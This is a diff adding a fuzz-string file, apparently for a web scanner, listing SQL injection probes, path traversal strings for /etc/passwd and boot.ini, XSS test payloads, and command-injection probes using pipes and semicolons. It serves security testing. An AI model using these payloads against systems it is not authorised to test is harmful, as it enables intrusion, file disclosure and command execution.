@@ -1,0 +1,62 @@
+## Comment begins with TWO hashes
+## NO blank lines
+## Comment fuzzstring - tab seperator (any amount of)
+##
+## SQL injection section------->
+admin'--	SQL 101 - test for admin with comment
+admin'		SQL 101 - test for admin without comments
+'test		SQL injection test
+'test--		SQL injection test with comments
+'or 1=1--	SQL or 1=1 with comments for alpha
+or 1=1--	SQL or 1=1 for numbers
+'or 1=1		SQL or 1=1 without comments for alpha
+or 1=1		SQL or 1=1 without comments for numbers
+'or '1'='1	SQL or 1=1 by completing the query
+' or 1=1#	SQL or 1=1 with mysql commenting - alpha
+or 1=1#		SQL or 1=1 with mysql commenting - numbers
+or 1=1		SQL or 1=1 with no comments for numbers
+" or 1=1#	SQL or 1=1 with terminating string a quote
+admin'#		SQL username admin with mysql commenting
+%		SQL wildcard
+##
+## File and traversal section ---------->
+##
+../../../../../../../../etc/passwd	basic traversal for Unix
+/etc/passwd				direct file access - Unix
+/*					* for Unix
+../../../../../../../../*		traversal and star for Unix
+..\..\..\..\..\..\..\..\boot.ini	basic traversal for MS
+\boot.ini				direct file access for MS
+\*					* for MS
+..\..\..\..\..\..\..\..\*		traversal and star for MS
+<..\..\..\..\..\..\..\..\boot.ini	redirect + traversal for MS
+|..\..\..\..\..\..\..\..\boot.ini	piping + traversal for MS
+<../../../../../../../../etc/passwd	redirect + traversal for Unix
+|../../../../../../../../etc/passwd	piping + traversal for Unix
+##
+## Cross Site scripting (XSS) section ---------->
+##
+<script>window.alert('testXSS');</script>	basic XSS test with pop-up
+<h1>testXSS</h1>				basic XSS test with header1
+##
+## Execution section------------->
+##
+|dir	piping - MS
+<dir	redirection - MS
+;dir	tying - MS
+&dir	tying 2 - MS
+|ls	piping - Unix
+<ls	redirection - Unix
+;ls	tying - Unix
+&ls	typing2 - Unix
+##
+## Other stuff --------->
+##
+normal			Kind of baseline response
+100			kind of baseline response (numeric)
+-1			Some number based systems does not like <0
+%00			Null byte
+*			Wildcard for various systems		
+<([{			Various closing braces/brackets				
+>)]}			Various opening braces/brackets
+!@#$%^&*_+|"?		Just a load of junk	
